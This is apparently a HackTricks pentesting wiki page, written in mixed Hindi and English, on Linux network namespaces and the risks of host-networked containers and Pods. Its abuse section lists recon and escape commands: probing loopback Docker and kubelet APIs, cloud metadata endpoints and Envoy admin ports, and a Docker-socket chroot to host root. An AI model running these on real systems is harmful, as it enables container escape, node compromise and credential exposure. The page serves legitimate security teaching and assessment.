# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

Network namespace interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, UNIX-domain abstract socket namespace, और `/proc/net` जैसी files की contents जैसे network-related resources को isolate करता है।<sup>[[2]](#references)</sup> इसी कारण container के पास अपना `eth0`, अपनी local routes और अपना loopback device दिखाई दे सकता है, जबकि उसके पास host का वास्तविक network stack नहीं होता।

Security के दृष्टिकोण से यह महत्वपूर्ण है, क्योंकि network isolation केवल port binding तक सीमित नहीं है। एक private network namespace यह सीमित करता है कि workload सीधे तौर पर क्या observe या reconfigure कर सकता है। एक बार जब वह namespace host के साथ share हो जाता है, तो container को अचानक host listeners, host-local services, abstract AF_UNIX endpoints और उन network control points की visibility मिल सकती है जिन्हें application के सामने expose करने का कभी उद्देश्य नहीं था।

## संचालन

नया बनाया गया network namespace interfaces attach किए जाने तक एक empty या लगभग empty network environment से शुरू होता है। इसके बाद container runtimes virtual interfaces create या connect करते हैं, addresses assign करते हैं और routes configure करते हैं, ताकि workload को अपेक्षित connectivity मिल सके। Bridge-based deployments में आमतौर पर इसका अर्थ होता है कि container को host bridge से connected veth-backed interface दिखाई देता है। Kubernetes में CNI plugins Pod networking के लिए इसी तरह का setup संभालते हैं।

यह architecture बताता है कि `--network=host` या `hostNetwork: true` इतना बड़ा बदलाव क्यों है। तैयार private network stack प्राप्त करने के बजाय workload host के वास्तविक network stack से जुड़ जाता है।

## Lab

आप एक लगभग empty network namespace को इस तरह देख सकते हैं:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
और आप सामान्य और host-networked containers की तुलना इनके साथ कर सकते हैं:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host-networked container के पास अब अपना isolated socket और interface view नहीं है। यह बदलाव अपने-आप में पहले से ही significant है, इससे पहले कि आप यह पूछें कि process के पास कौन-सी capabilities हैं।

## Runtime Usage

Docker और Podman सामान्यतः प्रत्येक container के लिए एक private network namespace बनाते हैं, जब तक कि उन्हें अलग तरीके से configure न किया गया हो। Kubernetes आमतौर पर प्रत्येक Pod को अपना network namespace देता है, जिसे उस Pod के अंदर मौजूद containers share करते हैं, लेकिन host से अलग रखते हैं। इसका अर्थ है कि `127.0.0.1` आमतौर पर container-local के बजाय Pod-local होता है: केवल localhost पर bound listener सामान्यतः उसके sidecars और siblings से reachable होता है। Incus/LXC systems भी network-namespace आधारित rich isolation प्रदान करते हैं, जिनमें virtual networking setups की विविधता अधिक होती है।

सामान्य principle यह है कि private networking default isolation boundary है, जबकि host networking उस boundary से स्पष्ट opt-out है।

## Misconfigurations

सबसे महत्वपूर्ण misconfiguration host network namespace को share करना है। ऐसा कभी-कभी performance, low-level monitoring या convenience के लिए किया जाता है, लेकिन इससे containers के लिए उपलब्ध सबसे स्पष्ट boundaries में से एक हट जाती है। Host-local listeners अधिक direct तरीके से reachable हो जाते हैं, localhost-only services accessible हो सकती हैं, और `CAP_NET_ADMIN` या `CAP_NET_RAW` जैसी capabilities कहीं अधिक dangerous हो जाती हैं, क्योंकि इनके द्वारा enable किए गए operations अब host के अपने network environment पर लागू होते हैं।

एक अन्य समस्या network namespace के private होने पर भी network-related capabilities को जरूरत से अधिक grant करना है। Private namespace मदद करता है, लेकिन इससे raw sockets या advanced network control harmless नहीं हो जाते।

Kubernetes में `hostNetwork: true` यह भी बदल देता है कि आप Pod-level network segmentation पर कितना भरोसा कर सकते हैं। Kubernetes document करता है कि कई network plugins `podSelector` / `namespaceSelector` matching के लिए `hostNetwork` Pod traffic को ठीक से distinguish नहीं कर सकते और इसलिए इसे ordinary node traffic की तरह treat करते हैं।<sup>[[1]](#references)</sup> Attacker के दृष्टिकोण से, इसका अर्थ है कि compromised `hostNetwork` workload को अक्सर एक normal Pod के रूप में नहीं, बल्कि node-level network foothold के रूप में treat करना चाहिए, जो overlay-network workloads पर लागू उन्हीं policy assumptions से constrained हो।

## Abuse

Weakly isolated setups में attackers host listening services inspect कर सकते हैं, केवल loopback पर bound management endpoints तक पहुंच सकते हैं, exact capabilities और environment के आधार पर traffic sniff या interfere कर सकते हैं, अथवा `CAP_NET_ADMIN` मौजूद होने पर routing और firewall state को reconfigure कर सकते हैं। किसी cluster में, इससे lateral movement और control-plane reconnaissance भी आसान हो सकता है।

यदि आपको host networking का संदेह है, तो यह confirm करके शुरुआत करें कि visible interfaces और listeners isolated container network के बजाय host से संबंधित हैं:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services अक्सर पहली दिलचस्प discovery होती हैं:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets एक और आसानी से छूट जाने वाला target हैं, क्योंकि वे network-namespace scoped होते हैं, भले ही वे TCP/UDP listeners जैसे न दिखें और `/run` के अंतर्गत filesystem paths के रूप में मौजूद भी न हों। इसलिए host-networked container को उन host-only control channels तक access विरासत में मिल सकता है, जिन्हें container में bind-mount किया ही नहीं गया था:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
एक ऐतिहासिक उदाहरण `containerd-shim` abstract-socket exposure bug था, लेकिन व्यापक सीख किसी विशिष्ट CVE से अधिक महत्वपूर्ण है: जब कोई workload host network namespace में शामिल हो जाता है, तो abstract AF_UNIX services भी attack surface का हिस्सा बन जाती हैं।<sup>[[3]](#references)</sup> यदि वे sockets runtime-संबंधित या administrative दिखाई दें, तो [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md) की ओर pivot करें।

यदि network capabilities मौजूद हों, तो जाँचें कि workload visible stack का निरीक्षण या उसमें बदलाव कर सकता है या नहीं:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
आधुनिक kernels पर, host networking और `CAP_NET_ADMIN` केवल `iptables` / `nftables` में बदलावों से आगे packet path तक पहुंच भी प्रदान कर सकते हैं। `tc` qdiscs और filters भी namespace-scoped होते हैं, इसलिए shared host network namespace में वे उन host interfaces पर लागू होते हैं जिन्हें container देख सकता है। यदि `CAP_BPF` भी मौजूद हो, तो TC और XDP loaders जैसे network-related eBPF programs भी प्रासंगिक हो जाते हैं:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
यह महत्वपूर्ण है क्योंकि attacker केवल firewall rules को rewrite ही नहीं, बल्कि host interface level पर traffic को mirror, redirect, shape या drop भी कर सकता है। Private network namespace में ये actions केवल container view तक सीमित रहते हैं; shared host namespace में इनका प्रभाव host पर पड़ सकता है।

Cluster या cloud environments में, host networking metadata और control-plane-adjacent services की quick local recon को भी उचित ठहराती है:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes में याद रखें कि multi-container Pod में **किसी भी** container का compromise sibling containers और sidecars द्वारा खोले गए localhost listeners तक भी access देता है, क्योंकि पूरा Pod एक ही network namespace share करता है। यह service-mesh, observability और helper containers के संदर्भ में विशेष रूप से महत्वपूर्ण हो जाता है, जिनके admin या debug interfaces जानबूझकर cluster-wide के बजाय केवल Pod-internal होते हैं:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
"bound to localhost" को **Pod-private**, न कि **container-private**, मानें। Pod में एक container के compromise होने के बाद यह धारणा समाप्त हो जाती है।

### पूर्ण उदाहरण: Host Networking + Local Runtime / Kubelet Access

Host networking अपने-आप host root प्रदान नहीं करता, लेकिन यह अक्सर ऐसी services को expose करता है जो जानबूझकर केवल node से ही reachable होती हैं। यदि इनमें से किसी service की protection कमजोर है, तो host networking privilege-escalation का सीधा path बन जाता है।

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost पर Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
प्रभाव:

- यदि proper protection के बिना local runtime API expose हो, तो direct host compromise
- यदि kubelet या local agents reachable हों, तो cluster reconnaissance या lateral movement
- `CAP_NET_ADMIN` के साथ combined होने पर traffic manipulation या denial of service

## जांच

इन जांचों का goal यह पता लगाना है कि process के पास private network stack है या नहीं, कौन-से routes और listeners दिखाई देते हैं, और capabilities test करने से पहले ही network view host जैसा दिखाई देता है या नहीं।
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
यहाँ क्या महत्वपूर्ण है:

- यदि `/proc/self/ns/net` और `/proc/1/ns/net` पहले से host-जैसे दिखते हैं, तो container संभवतः host network namespace या किसी अन्य non-private namespace को share कर रहा है।
- `lsns -t net` और `ip netns identify` तब उपयोगी होते हैं जब shell पहले से किसी named या persistent namespace के अंदर हो और आप उसे host side से `/run/netns` objects के साथ correlate करना चाहते हों।
- `ss -lntup` विशेष रूप से महत्वपूर्ण है क्योंकि यह loopback-only listeners और local management endpoints दिखाता है। `ss -xap` और `/proc/net/unix` abstract-socket view जोड़ते हैं, जिसे सामान्य filesystem socket hunts में नहीं देखा जाता।
- यदि `CAP_NET_ADMIN`, `CAP_NET_RAW`, या `CAP_BPF` मौजूद हो, तो routes, interface names, firewall context, `tc` state और eBPF attachments अधिक महत्वपूर्ण हो जाते हैं।
- Kubernetes में, `hostNetwork` Pod से failed service-name resolution का अर्थ केवल यह हो सकता है कि Pod `dnsPolicy: ClusterFirstWithHostNet` का उपयोग नहीं कर रहा है; इसका अर्थ यह नहीं है कि service मौजूद नहीं है।
- Multi-container Pods में localhost listeners पूरे Pod network namespace से संबंधित होते हैं, इसलिए compromised container से loopback-only port को unreachable मानने से पहले sidecars और sibling containers की जाँच करें।

Container की समीक्षा करते समय network namespace का मूल्यांकन हमेशा capability set के साथ करें। Strong network capabilities वाली host networking, narrow default capability set वाली bridge networking से बहुत अलग security posture होती है।

## References

- [1] [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` and abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
